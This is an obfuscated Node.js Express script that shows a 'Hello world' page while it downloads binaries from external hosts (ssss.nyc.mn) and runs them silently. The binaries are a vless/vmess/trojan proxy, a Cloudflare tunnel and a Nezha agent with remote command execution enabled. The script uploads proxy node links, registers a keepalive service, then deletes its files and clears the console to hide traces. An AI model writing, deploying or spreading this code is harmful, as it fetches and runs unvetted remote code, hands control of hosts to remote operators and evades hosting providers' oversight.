const _0x102649=_0x26c2;(function(_0x464da0,_0x1975ee){const _0x3156a5=_0x26c2,_0x42f45b=_0x464da0();while(!![]){try{const _0x18736d=-parseInt(_0x3156a5(0x223))/0x1+-parseInt(_0x3156a5(0x254))/0x2+-parseInt(_0x3156a5(0x1cd))/0x3+parseInt(_0x3156a5(0x232))/0x4*(parseInt(_0x3156a5(0x1d6))/0x5)+parseInt(_0x3156a5(0x21a))/0x6+-parseInt(_0x3156a5(0x1e1))/0x7*(parseInt(_0x3156a5(0x1ab))/0x8)+parseInt(_0x3156a5(0x1f2))/0x9;if(_0x18736d===_0x1975ee)break;else _0x42f45b['push'](_0x42f45b['shift']());}catch(_0x307e9f){_0x42f45b['push'](_0x42f45b['shift']());}}}(_0x217f,0xea549));const express=require('express'),app=express(),axios=require(_0x102649(0x23d)),os=require('os'),fs=require('fs'),path=require(_0x102649(0x207)),{promisify}=require(_0x102649(0x1bc)),exec=promisify(require(_0x102649(0x246))[_0x102649(0x213)]),UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],FILE_PATH=process.env.FILE_PATH||'.tmp',SUB_PATH=process.env.SUB_PATH||'sub',PORT=process.env.SERVER_PORT||process.env.PORT||0xbb8,UUID=process.env.UUID||_0x102649(0x214),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',ARGO_DOMAIN=process.env.ARGO_DOMAIN||'',ARGO_AUTH=process.env.ARGO_AUTH||'',ARGO_PORT=process.env.ARGO_PORT||0x1f41,CFIP=process.env.CFIP||'saas.sin.fan',CFPORT=process.env.CFPORT||0x1bb,NAME=process.env.NAME||'vvoss';!fs[_0x102649(0x248)](FILE_PATH)?(fs[_0x102649(0x236)](FILE_PATH),console[_0x102649(0x21f)](FILE_PATH+_0x102649(0x1de))):console[_0x102649(0x21f)](FILE_PATH+_0x102649(0x230));function generateRandomName(){const _0xad4848=_0x102649,_0x5537d8=_0xad4848(0x1fa);let _0x59e837='';for(let _0x2af7a6=0x0;_0x2af7a6<0x6;_0x2af7a6++){_0x59e837+=_0x5537d8[_0xad4848(0x24f)](Math[_0xad4848(0x1f0)](Math[_0xad4848(0x1df)]()*_0x5537d8[_0xad4848(0x1ea)]));}return _0x59e837;}function _0x217f(){const _0x566441=['Error\x20downloading\x20files:','aarch64','message','https://amd64.ssss.nyc.mn/web','https://oooo.serv00.net/add-url','trojan','readFileSync','\x22\x20>\x20/dev/null\x202>&1','get','\x20-p\x20','true','path','https://amd64.ssss.nyc.mn/bot','readFile','2053','block','post','status','http://ip-api.com/json','/tunnel.yml\x20run','http','127.0.0.1','ArgoDomain:','exec','a83c9448-8d3c-4562-9dff-c51151ce4ed1','Empowerment\x20success\x20for\x20','?encryption=none&security=tls&sni=','match','config.json','/dev/null','221574sbDYGL','Error\x20executing\x20command:\x20','isp','vless','org','log','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Add\x20automatic\x20access\x20task\x20faild:\x20','.exe\x20>\x20nul\x202>&1','1680842aXaZZF','/api/add-subscriptions','writeFileSync','arm','\x20>\x20nul\x202>&1','Mozilla/5.0','&fp=firefox&type=ws&host=','basename','close','unlinkSync','readdirSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20already\x20exists','direct','555908tZkhbm','/trojan-argo','/api/add-nodes','tcp','mkdirSync','platform','countryCode','error','php\x20running\x20error:\x20','\x20is\x20running','443','axios','substring','includes','clear','win32','stream','\x0a\x20\x20credentials-file:\x20','then','boot.log','child_process','/vmess-argo?ed=2560','existsSync','\x20successfully','https://amd64.ssss.nyc.mn/agent','index.html','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','utf8','response','charAt','country_code','/vmess-argo','http\x20server\x20is\x20running\x20on\x20port:','auto','2947558WKRXsy','https://api.ip.sb/geoip','pkill\x20-f\x20\x22[','2083','\x20-c\x20','map','blackhole','filter','data','fileUrl','isFile','8FkSlbn','test','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','text/plain;\x20charset=utf-8','statSync','pop','\x20>/dev/null\x202>&1','https://amd64.ssss.nyc.mn/v1','send','listen','Empowerment\x20failed\x20for\x20','/sub.txt\x20saved\x20successfully','taskkill\x20/f\x20/im\x20','freedom','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','split','arch','util','Content-Type','2096','push','firefox','\x0a\x20\x20\x20\x20','chmod','Unhandled\x20error\x20in\x20startserver:','promises','web\x20running\x20error:\x20','Subscription\x20uploaded\x20successfully','toString','config.yaml','nohup\x20','createWriteStream','application/json','Error\x20in\x20startserver:','1239150ROXvxo','\x20-s\x20','ARGO_DOMAIN:','quic','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Download\x20','2087','false','5VMDQvC','pipe','https://arm64.ssss.nyc.mn/bot','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','8443','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','forEach','\x20is\x20created','random','catch','5770009aKkZxK','rm\x20-rf\x20','/vless-argo','vmess','none','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','from','unshift','base64','length','tunnel.json','\x0avless://','replace','tls','unlink','floor','\x20failed:\x20','46582821RgjNzM','set','\x0a\x0avmess://','join','utf-8','App\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Skipping\x20adding\x20automatic\x20access\x20task','abcdefghijklmnopqrstuvwxyz','stringify'];_0x217f=function(){return _0x566441;};return _0x217f();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x102649(0x1f5)](FILE_PATH,npmName),phpPath=path[_0x102649(0x1f5)](FILE_PATH,phpName),webPath=path[_0x102649(0x1f5)](FILE_PATH,webName),botPath=path[_0x102649(0x1f5)](FILE_PATH,botName),subPath=path[_0x102649(0x1f5)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x102649(0x1f5)](FILE_PATH,'boot.log'),configPath=path[_0x102649(0x1f5)](FILE_PATH,_0x102649(0x218));function deleteNodes(){const _0x26c532=_0x102649;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x41fa84;try{_0x41fa84=fs[_0x26c532(0x202)](subPath,'utf-8');}catch{return null;}const _0x55bb7b=Buffer[_0x26c532(0x1e7)](_0x41fa84,_0x26c532(0x1e9))['toString'](_0x26c532(0x1f6)),_0x50028d=_0x55bb7b[_0x26c532(0x1ba)]('\x0a')[_0x26c532(0x1a7)](_0x511634=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x26c532(0x1ac)](_0x511634));if(_0x50028d[_0x26c532(0x1ea)]===0x0)return;return axios[_0x26c532(0x20c)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x50028d}),{'headers':{'Content-Type':_0x26c532(0x1cb)}})[_0x26c532(0x1e0)](_0x1d2281=>{return null;}),null;}catch(_0x51de9f){return null;}}function cleanupOldFiles(){const _0x579b10=_0x102649;try{const _0x5c0fe6=fs[_0x579b10(0x22d)](FILE_PATH);_0x5c0fe6['forEach'](_0x1649ba=>{const _0x7028d9=_0x579b10,_0x4a78d7=path[_0x7028d9(0x1f5)](FILE_PATH,_0x1649ba);try{const _0x2fc894=fs[_0x7028d9(0x1af)](_0x4a78d7);_0x2fc894[_0x7028d9(0x1aa)]()&&fs[_0x7028d9(0x22c)](_0x4a78d7);}catch(_0x5b0fb9){}});}catch(_0x1c7387){}}async function generateConfig(){const _0x13b64b=_0x102649,_0x5ba33a={'log':{'access':_0x13b64b(0x219),'error':_0x13b64b(0x219),'loglevel':_0x13b64b(0x1e5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x13b64b(0x21d),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x13b64b(0x1e5),'fallbacks':[{'dest':0xbb9},{'path':_0x13b64b(0x1e3),'dest':0xbba},{'path':_0x13b64b(0x251),'dest':0xbbb},{'path':_0x13b64b(0x233),'dest':0xbbc}]},'streamSettings':{'network':_0x13b64b(0x235)}},{'port':0xbb9,'listen':_0x13b64b(0x211),'protocol':_0x13b64b(0x21d),'settings':{'clients':[{'id':UUID}],'decryption':_0x13b64b(0x1e5)},'streamSettings':{'network':'tcp','security':_0x13b64b(0x1e5)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x13b64b(0x21d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x13b64b(0x1e3)}},'sniffing':{'enabled':!![],'destOverride':[_0x13b64b(0x210),_0x13b64b(0x1ee),_0x13b64b(0x1d0)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x13b64b(0x1e4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x13b64b(0x251)}},'sniffing':{'enabled':!![],'destOverride':[_0x13b64b(0x210),'tls',_0x13b64b(0x1d0)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x13b64b(0x201),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x13b64b(0x1e5),'wsSettings':{'path':_0x13b64b(0x233)}},'sniffing':{'enabled':!![],'destOverride':[_0x13b64b(0x210),'tls',_0x13b64b(0x1d0)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x13b64b(0x1b8),'tag':_0x13b64b(0x231)},{'protocol':_0x13b64b(0x1a6),'tag':_0x13b64b(0x20b)}]};fs[_0x13b64b(0x225)](path[_0x13b64b(0x1f5)](FILE_PATH,'config.json'),JSON[_0x13b64b(0x1fb)](_0x5ba33a,null,0x2));}function getSystemArchitecture(){const _0x46a5a9=_0x102649,_0x2c16f2=os[_0x46a5a9(0x1bb)]();return _0x2c16f2===_0x46a5a9(0x226)||_0x2c16f2==='arm64'||_0x2c16f2===_0x46a5a9(0x1fd)?_0x46a5a9(0x226):'amd';}function _0x26c2(_0x541915,_0x38ae87){_0x541915=_0x541915-0x1a5;const _0x217f12=_0x217f();let _0x26c264=_0x217f12[_0x541915];return _0x26c264;}function downloadFile(_0x497568,_0x52a656,_0x523579){const _0x51fb0e=_0x102649,_0x6def7c=_0x497568;!fs[_0x51fb0e(0x248)](FILE_PATH)&&fs[_0x51fb0e(0x236)](FILE_PATH,{'recursive':!![]});const _0x38b831=fs[_0x51fb0e(0x1ca)](_0x6def7c);axios({'method':'get','url':_0x52a656,'responseType':_0x51fb0e(0x242)})[_0x51fb0e(0x244)](_0x4a9df2=>{const _0xf262e9=_0x51fb0e;_0x4a9df2[_0xf262e9(0x1a8)][_0xf262e9(0x1d7)](_0x38b831),_0x38b831['on']('finish',()=>{const _0x12e019=_0xf262e9;_0x38b831[_0x12e019(0x22b)](),console['log']('Download\x20'+path[_0x12e019(0x22a)](_0x6def7c)+_0x12e019(0x249)),_0x523579(null,_0x6def7c);}),_0x38b831['on'](_0xf262e9(0x239),_0x860085=>{const _0x17e977=_0xf262e9;fs[_0x17e977(0x1ef)](_0x6def7c,()=>{});const _0x223748=_0x17e977(0x1d3)+path[_0x17e977(0x22a)](_0x6def7c)+_0x17e977(0x1f1)+_0x860085[_0x17e977(0x1fe)];console[_0x17e977(0x239)](_0x223748),_0x523579(_0x223748);});})['catch'](_0x291d11=>{const _0x19079a=_0x51fb0e,_0x5abc6a=_0x19079a(0x1d3)+path[_0x19079a(0x22a)](_0x6def7c)+_0x19079a(0x1f1)+_0x291d11[_0x19079a(0x1fe)];console[_0x19079a(0x239)](_0x5abc6a),_0x523579(_0x5abc6a);});}async function downloadFilesAndRun(){const _0x51d69d=_0x102649,_0x2ffc2c=getSystemArchitecture(),_0x5c90fb=getFilesForArchitecture(_0x2ffc2c);if(_0x5c90fb[_0x51d69d(0x1ea)]===0x0){console['log'](_0x51d69d(0x1e6));return;}const _0x5cde9c=_0x5c90fb[_0x51d69d(0x1a5)](_0x2d7430=>{return new Promise((_0x57b6a1,_0x3c3513)=>{const _0x291ff5=_0x26c2;downloadFile(_0x2d7430['fileName'],_0x2d7430[_0x291ff5(0x1a9)],(_0x28edf6,_0x55fdaa)=>{_0x28edf6?_0x3c3513(_0x28edf6):_0x57b6a1(_0x55fdaa);});});});try{await Promise['all'](_0x5cde9c);}catch(_0x18e3e9){console['error'](_0x51d69d(0x1fc),_0x18e3e9);return;}function _0x3552c6(_0x20cd36){const _0xa8f10=_0x51d69d,_0xd7cd4a=0x1fd;_0x20cd36[_0xa8f10(0x1dd)](_0x50c052=>{const _0x284e01=_0xa8f10;fs[_0x284e01(0x248)](_0x50c052)&&fs[_0x284e01(0x1c2)](_0x50c052,_0xd7cd4a,_0x1eef5f=>{const _0x241ad4=_0x284e01;_0x1eef5f?console[_0x241ad4(0x239)](_0x241ad4(0x1b5)+_0x50c052+':\x20'+_0x1eef5f):console['log'](_0x241ad4(0x215)+_0x50c052+':\x20'+_0xd7cd4a[_0x241ad4(0x1c7)](0x8));});});}const _0x3a3790=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3552c6(_0x3a3790);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e6f3d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x51d69d(0x1ba)](':')[_0x51d69d(0x1b0)]():'',_0x11618d=new Set(['443',_0x51d69d(0x1da),_0x51d69d(0x1be),_0x51d69d(0x1d4),_0x51d69d(0x257),_0x51d69d(0x20a)]),_0x3b5645=_0x11618d['has'](_0x5e6f3d)?_0x51d69d(0x206):_0x51d69d(0x1d5),_0x197514='\x0aclient_secret:\x20'+NEZHA_KEY+_0x51d69d(0x1ad)+NEZHA_SERVER+_0x51d69d(0x24c)+_0x3b5645+_0x51d69d(0x1b9)+UUID;fs[_0x51d69d(0x225)](path[_0x51d69d(0x1f5)](FILE_PATH,_0x51d69d(0x1c8)),_0x197514);const _0x5560dd='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5560dd),console[_0x51d69d(0x21f)](phpName+'\x20is\x20running'),await new Promise(_0x31b828=>setTimeout(_0x31b828,0x3e8));}catch(_0x26716a){console[_0x51d69d(0x239)](_0x51d69d(0x23a)+_0x26716a);}}else{let _0x5f2517='';const _0x10806b=[_0x51d69d(0x23c),_0x51d69d(0x1da),_0x51d69d(0x1be),_0x51d69d(0x1d4),_0x51d69d(0x257),_0x51d69d(0x20a)];_0x10806b[_0x51d69d(0x23f)](NEZHA_PORT)&&(_0x5f2517='--tls');const _0x4880fb=_0x51d69d(0x1c9)+npmPath+_0x51d69d(0x1ce)+NEZHA_SERVER+':'+NEZHA_PORT+_0x51d69d(0x205)+NEZHA_KEY+'\x20'+_0x5f2517+_0x51d69d(0x1d9);try{await exec(_0x4880fb),console[_0x51d69d(0x21f)](npmName+_0x51d69d(0x23b)),await new Promise(_0x7b25e0=>setTimeout(_0x7b25e0,0x3e8));}catch(_0x16d83c){console[_0x51d69d(0x239)]('npm\x20running\x20error:\x20'+_0x16d83c);}}}else console[_0x51d69d(0x21f)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x29d4a3='nohup\x20'+webPath+_0x51d69d(0x258)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x29d4a3),console[_0x51d69d(0x21f)](webName+_0x51d69d(0x23b)),await new Promise(_0x22506f=>setTimeout(_0x22506f,0x3e8));}catch(_0x186983){console[_0x51d69d(0x239)](_0x51d69d(0x1c5)+_0x186983);}if(fs[_0x51d69d(0x248)](botPath)){let _0x3c68cb;if(ARGO_AUTH[_0x51d69d(0x217)](/^[A-Z0-9a-z=]{120,250}$/))_0x3c68cb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x51d69d(0x217)](/TunnelSecret/)?_0x3c68cb=_0x51d69d(0x22e)+FILE_PATH+_0x51d69d(0x20f):_0x3c68cb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x51d69d(0x1d1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3c68cb+_0x51d69d(0x1db)),console[_0x51d69d(0x21f)](botName+'\x20is\x20running'),await new Promise(_0x3a9001=>setTimeout(_0x3a9001,0x7d0));}catch(_0x1df904){console[_0x51d69d(0x239)](_0x51d69d(0x21b)+_0x1df904);}}await new Promise(_0x54b0f4=>setTimeout(_0x54b0f4,0x1388));}function getFilesForArchitecture(_0x4b1dc4){const _0x1c984c=_0x102649;let _0x126b2a;_0x4b1dc4===_0x1c984c(0x226)?_0x126b2a=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x1c984c(0x1d8)}]:_0x126b2a=[{'fileName':webPath,'fileUrl':_0x1c984c(0x1ff)},{'fileName':botPath,'fileUrl':_0x1c984c(0x208)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x47aadb=_0x4b1dc4==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x1c984c(0x24a);_0x126b2a[_0x1c984c(0x1e8)]({'fileName':npmPath,'fileUrl':_0x47aadb});}else{const _0x5cb827=_0x4b1dc4==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x1c984c(0x1b2);_0x126b2a[_0x1c984c(0x1e8)]({'fileName':phpPath,'fileUrl':_0x5cb827});}}return _0x126b2a;}function argoType(){const _0x1de9c5=_0x102649;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1de9c5(0x21f)](_0x1de9c5(0x220));return;}if(ARGO_AUTH[_0x1de9c5(0x23f)]('TunnelSecret')){fs[_0x1de9c5(0x225)](path[_0x1de9c5(0x1f5)](FILE_PATH,_0x1de9c5(0x1eb)),ARGO_AUTH);const _0x402b22='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x1de9c5(0x243)+path[_0x1de9c5(0x1f5)](FILE_PATH,_0x1de9c5(0x1eb))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1de9c5(0x1dc);fs[_0x1de9c5(0x225)](path[_0x1de9c5(0x1f5)](FILE_PATH,'tunnel.yml'),_0x402b22);}else console['log'](_0x1de9c5(0x1f8));}async function extractDomains(){const _0x22d5a0=_0x102649;let _0x3cc6d3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3cc6d3=ARGO_DOMAIN,console[_0x22d5a0(0x21f)](_0x22d5a0(0x1cf),_0x3cc6d3),await _0x4c8733(_0x3cc6d3);else try{const _0x3f920d=fs[_0x22d5a0(0x202)](path['join'](FILE_PATH,_0x22d5a0(0x245)),_0x22d5a0(0x1f6)),_0x3c7341=_0x3f920d[_0x22d5a0(0x1ba)]('\x0a'),_0x5c909f=[];_0x3c7341[_0x22d5a0(0x1dd)](_0x56949d=>{const _0x31e034=_0x56949d['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x31e034){const _0x6a501c=_0x31e034[0x1];_0x5c909f['push'](_0x6a501c);}});if(_0x5c909f[_0x22d5a0(0x1ea)]>0x0)_0x3cc6d3=_0x5c909f[0x0],console[_0x22d5a0(0x21f)](_0x22d5a0(0x212),_0x3cc6d3),await _0x4c8733(_0x3cc6d3);else{console[_0x22d5a0(0x21f)](_0x22d5a0(0x1d2)),fs[_0x22d5a0(0x22c)](path['join'](FILE_PATH,_0x22d5a0(0x245)));async function _0x4cee16(){const _0x41baa6=_0x22d5a0;try{process[_0x41baa6(0x237)]===_0x41baa6(0x241)?await exec(_0x41baa6(0x1b7)+botName+_0x41baa6(0x222)):await exec(_0x41baa6(0x256)+botName[_0x41baa6(0x24f)](0x0)+']'+botName[_0x41baa6(0x23e)](0x1)+_0x41baa6(0x203));}catch(_0x4fee23){}}_0x4cee16(),await new Promise(_0x186305=>setTimeout(_0x186305,0xbb8));const _0xb9d042='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x22d5a0(0x1d1)+ARGO_PORT;try{await exec(_0x22d5a0(0x1c9)+botPath+'\x20'+_0xb9d042+_0x22d5a0(0x1db)),console['log'](botName+_0x22d5a0(0x23b)),await new Promise(_0xb2173a=>setTimeout(_0xb2173a,0xbb8)),await extractDomains();}catch(_0x21e789){console['error'](_0x22d5a0(0x21b)+_0x21e789);}}}catch(_0x5c3e2c){console[_0x22d5a0(0x239)]('Error\x20reading\x20boot.log:',_0x5c3e2c);}async function _0x572d4a(){const _0x88d059=_0x22d5a0;try{const _0x3f453d=await axios[_0x88d059(0x204)](_0x88d059(0x255),{'headers':{'User-Agent':_0x88d059(0x228),'timeout':0xbb8}});if(_0x3f453d[_0x88d059(0x1a8)]&&_0x3f453d[_0x88d059(0x1a8)][_0x88d059(0x250)]&&_0x3f453d['data'][_0x88d059(0x21c)])return(_0x3f453d['data'][_0x88d059(0x250)]+'-'+_0x3f453d[_0x88d059(0x1a8)][_0x88d059(0x21c)])[_0x88d059(0x1ed)](/\s+/g,'_');}catch(_0x8a78b9){try{const _0x2c1fae=await axios['get'](_0x88d059(0x20e),{'headers':{'User-Agent':_0x88d059(0x228),'timeout':0xbb8}});if(_0x2c1fae['data']&&_0x2c1fae['data'][_0x88d059(0x20d)]==='success'&&_0x2c1fae[_0x88d059(0x1a8)][_0x88d059(0x238)]&&_0x2c1fae[_0x88d059(0x1a8)][_0x88d059(0x21e)])return(_0x2c1fae[_0x88d059(0x1a8)][_0x88d059(0x238)]+'-'+_0x2c1fae[_0x88d059(0x1a8)][_0x88d059(0x21e)])[_0x88d059(0x1ed)](/\s+/g,'_');}catch(_0x3984c6){}}return'Unknown';}async function _0x4c8733(_0x54ce2e){const _0x4bc47f=await _0x572d4a(),_0xf3ca2f=NAME?NAME+'-'+_0x4bc47f:_0x4bc47f;return new Promise(_0x175e45=>{setTimeout(()=>{const _0x4106bb=_0x26c2,_0x2e4766={'v':'2','ps':''+_0xf3ca2f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4106bb(0x253),'net':'ws','type':_0x4106bb(0x1e5),'host':_0x54ce2e,'path':_0x4106bb(0x247),'tls':_0x4106bb(0x1ee),'sni':_0x54ce2e,'alpn':'','fp':_0x4106bb(0x1c0)},_0x494436=_0x4106bb(0x1ec)+UUID+'@'+CFIP+':'+CFPORT+_0x4106bb(0x216)+_0x54ce2e+_0x4106bb(0x229)+_0x54ce2e+'&path=%2Fvless-argo%3Fed%3D2560#'+_0xf3ca2f+_0x4106bb(0x1f4)+Buffer[_0x4106bb(0x1e7)](JSON[_0x4106bb(0x1fb)](_0x2e4766))['toString'](_0x4106bb(0x1e9))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x54ce2e+_0x4106bb(0x229)+_0x54ce2e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0xf3ca2f+_0x4106bb(0x1c1);console['log'](Buffer['from'](_0x494436)[_0x4106bb(0x1c7)](_0x4106bb(0x1e9))),fs[_0x4106bb(0x225)](subPath,Buffer['from'](_0x494436)[_0x4106bb(0x1c7)]('base64')),console['log'](FILE_PATH+_0x4106bb(0x1b6)),uploadNodes(),app[_0x4106bb(0x204)]('/'+SUB_PATH,(_0xf0bd3d,_0x3a2e34)=>{const _0xcbd1ee=_0x4106bb,_0x388aab=Buffer[_0xcbd1ee(0x1e7)](_0x494436)[_0xcbd1ee(0x1c7)](_0xcbd1ee(0x1e9));_0x3a2e34[_0xcbd1ee(0x1f3)](_0xcbd1ee(0x1bd),_0xcbd1ee(0x1ae)),_0x3a2e34[_0xcbd1ee(0x1b3)](_0x388aab);}),_0x175e45(_0x494436);},0x7d0);});}}async function uploadNodes(){const _0x1e0c34=_0x102649;if(UPLOAD_URL&&PROJECT_URL){const _0x7a41f0=PROJECT_URL+'/'+SUB_PATH,_0x538dea={'subscription':[_0x7a41f0]};try{const _0x1503af=await axios[_0x1e0c34(0x20c)](UPLOAD_URL+_0x1e0c34(0x224),_0x538dea,{'headers':{'Content-Type':'application/json'}});return _0x1503af&&_0x1503af[_0x1e0c34(0x20d)]===0xc8?(console['log'](_0x1e0c34(0x1c6)),_0x1503af):null;}catch(_0x16c19c){if(_0x16c19c[_0x1e0c34(0x24e)]){if(_0x16c19c[_0x1e0c34(0x24e)][_0x1e0c34(0x20d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x48da49=fs[_0x1e0c34(0x202)](listPath,_0x1e0c34(0x1f6)),_0x50cb04=_0x48da49[_0x1e0c34(0x1ba)]('\x0a')[_0x1e0c34(0x1a7)](_0x89efbf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x89efbf));if(_0x50cb04[_0x1e0c34(0x1ea)]===0x0)return;const _0x22be80=JSON[_0x1e0c34(0x1fb)]({'nodes':_0x50cb04});try{const _0x3cb58c=await axios[_0x1e0c34(0x20c)](UPLOAD_URL+_0x1e0c34(0x234),_0x22be80,{'headers':{'Content-Type':_0x1e0c34(0x1cb)}});return _0x3cb58c&&_0x3cb58c['status']===0xc8?(console[_0x1e0c34(0x21f)]('Nodes\x20uploaded\x20successfully'),_0x3cb58c):null;}catch(_0x5a4931){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x15bba8=_0x26c2,_0x4e8c84=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e8c84['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e8c84[_0x15bba8(0x1bf)](phpPath);process[_0x15bba8(0x237)]===_0x15bba8(0x241)?exec('del\x20/f\x20/q\x20'+_0x4e8c84['join']('\x20')+_0x15bba8(0x227),_0x2559fa=>{const _0x3c4dc5=_0x15bba8;console['clear'](),console[_0x3c4dc5(0x21f)](_0x3c4dc5(0x1f7)),console[_0x3c4dc5(0x21f)](_0x3c4dc5(0x22f));}):exec(_0x15bba8(0x1e2)+_0x4e8c84['join']('\x20')+_0x15bba8(0x1b1),_0x25a110=>{const _0x1dab92=_0x15bba8;console[_0x1dab92(0x240)](),console[_0x1dab92(0x21f)](_0x1dab92(0x1f7)),console[_0x1dab92(0x21f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x362cf5=_0x102649;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x362cf5(0x21f)](_0x362cf5(0x1f9));return;}try{const _0x1c4b15=await axios[_0x362cf5(0x20c)](_0x362cf5(0x200),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x362cf5(0x1cb)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x1c4b15;}catch(_0x3618b8){return console['error'](_0x362cf5(0x221)+_0x3618b8[_0x362cf5(0x1fe)]),null;}}async function startserver(){const _0x196cc0=_0x102649;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x559093){console[_0x196cc0(0x239)](_0x196cc0(0x1cc),_0x559093);}}startserver()[_0x102649(0x1e0)](_0x5b2877=>{const _0x3f9b53=_0x102649;console[_0x3f9b53(0x239)](_0x3f9b53(0x1c3),_0x5b2877);}),app[_0x102649(0x204)]('/',async function(_0x57b71f,_0x402169){const _0x1beffb=_0x102649;try{const _0x48dcd4=path['join'](__dirname,_0x1beffb(0x24b)),_0x121384=await fs[_0x1beffb(0x1c4)][_0x1beffb(0x209)](_0x48dcd4,_0x1beffb(0x24d));_0x402169[_0x1beffb(0x1b3)](_0x121384);}catch(_0x5ed582){_0x402169[_0x1beffb(0x1b3)]('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!');}}),app[_0x102649(0x1b4)](PORT,()=>console[_0x102649(0x21f)](_0x102649(0x252)+PORT+'!'));
